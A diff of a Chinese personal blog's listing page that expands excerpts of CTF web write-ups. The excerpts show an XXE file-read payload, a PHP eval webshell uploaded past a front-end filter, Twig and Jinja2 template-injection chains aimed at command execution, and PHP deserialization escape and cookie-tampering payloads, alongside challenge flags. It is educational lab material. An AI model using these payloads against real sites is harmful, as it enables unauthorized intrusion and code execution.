@@ -82,12 +82,12 @@
 
 
 
-<meta name="description" content="人之所以能是相信能。">
+<meta name="description" content="人之所以能是因为相信能。">
 <meta property="og:type" content="website">
 <meta property="og:title" content="花间一壶酒">
 <meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="花间一壶酒">
-<meta property="og:description" content="人之所以能是相信能。">
+<meta property="og:description" content="人之所以能是因为相信能。">
 <meta property="og:locale">
 <meta property="article:author" content="徐行之">
 <meta name="twitter:card" content="summary">
@@ -162,7 +162,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">人之所以能是相信能。</p>
+        <p class="site-subtitle">人之所以能是因为相信能。</p>
       
   </div>
 
@@ -386,7 +386,10 @@
 1Content-Type: application/xml;charset=utf-8
 发现是XXE漏洞。
 先拿XXE漏洞poc读/flag。
-12345678&lt;?xml version=&quot;1.0&quot; encod
+12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;
+
+flag并不在这里，那读一下他的源码。
+12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quo
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -546,7 +549,15 @@
 前端验证
 可以使用浏览器的编辑功能，将页面中的submit事件删除，这样前端就不会对上传的文件后缀名进行检测，就能达到绕过的目的。
 
-上传一句话木马。1.ph
+上传一句话木马。1.php
+1&lt;?php @eval($_POST[&#x27;1&#x27;]); ?&gt;
+将文件扩展名改为.jpg
+抓包，把之前改的php文件改回来。
+
+连接蚁剑，或者
+禁用Javascrip。题中对文件的检测依靠于JavaScript的使用，禁用浏览器的JavaScript，可以直接让其过滤效果失效。以火狐浏览器为例，地址栏输入about:config，点击回车键，找到如图的地方，点击右边按钮禁用JavaScript。
+
+.htaccesshtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -699,7 +710,7 @@
         
           
           [MRCTF2020]Ezpop
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Welcome to index.php&lt;?php//flag
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public functio
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -855,7 +866,13 @@
 购买Chocolate Chip Cookie，抓包
 
 左边Cookie：
-123session=eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==&#123;&quot;money&quot;: 50, &qu
+123session=eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==&#123;&quot;money&quot;: 50, &quot;history&quot;: []&#125;
+
+右边Cookie：
+123session=eyJtb25leSI6IDQ5LCAiaGlzdG9yeSI6IFsiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIl19&#123;&quot;money&quot;: 49, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;]&#125;
+
+很明显少了1 。将id=0改成id=2，修改Cookie，
+12&#123;&quot;money&quot;: 500, &quot;history&
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1009,7 +1026,11 @@
           
           [安洵杯 2019]easy_serialize_php
 反序列化的对象逃逸问题一般分为两种：    第一种为关键词数增加    例如： where-&gt;hacker，这样词数由五个增加到6个    第二种为关键词数减少    例如：直接过滤掉一些关键词
-第一种情况比较好构造，直接构造多个关键词
+第一种情况比较好构造，直接构造多个关键词，这样就能逃出几个字符；第二种可以是通过键逃逸和值逃逸。
+值逃逸，这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对。
+1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function=show_image
+var_dump的结果为：
+1&quo
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1161,7 +1182,19 @@
       
         
           
-          [BJDCTF2020]Cookie is so stable参考：https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%
+          [BJDCTF2020]Cookie is so stable参考：https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig
+
+
+
+1&#123;&#123;7*7&#125;&#125;
+判断是Twig模板注入。
+
+
+1&lt;!-- Why not take a closer look at cookies? --&gt;
+
+抓包flag.php得到
+推测出cookie里的user参数就是注入点，
+1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFil
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1316,7 +1349,12 @@
           目录遍历
 翻到/4/2发现flag.txt。打开即得flag：ctfhub{cbea62a29562fc98d70ac63c}
 PHPINFO进入使用ctrl+f搜索关键词flag找到。ctfhub{63d000d45fd5de76f678580c} 
-备份文件下载网站源码当开发人员在线上环境中对源
+备份文件下载网站源码当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。目录扫描
+发现www.zip下载打开发现直接在地址栏址访问flag_14391792.txtctfhub{8158b72890f75d5b8c7ab9fb}
+bak文件当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。目录扫描
+发现index.php.bak，下载并打开
+ctfhub{bd76a4003c73ad6b158a12c0}
+vim缓存当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1475,7 +1513,10 @@ PHPINFO进入使用ctrl+f搜索关键词flag找到。ctfhub{63d000d45fd5de76f678
 
 flask的debug模式。
 
-1
+1base64decode在不会解析的时候就会报错，然后习惯性对base64解密页面进行报错实验，base64解密界面随意输入字符串，导致解码报错，进入Debug页面，发现了部分源码。
+
+
+12345678910@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def decode():	if request.values.get(&#x27;text&#x27;) :		text = request.values.get(&quot;text&quot;)		text_decode = base6
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1630,7 +1671,10 @@ flask的debug模式。
           [CSCCTF 2019 Qual]FlaskLight查看源码。
 12?search=&#123;&#123;7*7&#125;&#125;#通过回显判断SSTI
 
-12?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclass
+12?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;#爆出所有类
+
+使用脚本查找可利用的类。
+12345678910111213141516171819202122import requestsimport reimport htmlimport timeindex = 0for i in range(170, 1000):    try:        url = &quot;http://17ad255a-204e-4624-b878-e3e0d62e526a.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__su
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1784,7 +1828,7 @@ flask的debug模式。
           
           [HarekazeCTF2019]encode_and_encode
 点击Source Code，得到源码。
-12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?phperror_reporting
+12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    &#x27;\.\.&#x27;,    // no stream wrapper    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,    // no data exfiltration    &#x27;flag&#x2
           ...
           <!--noindex-->
           <div class="post-button text-center">
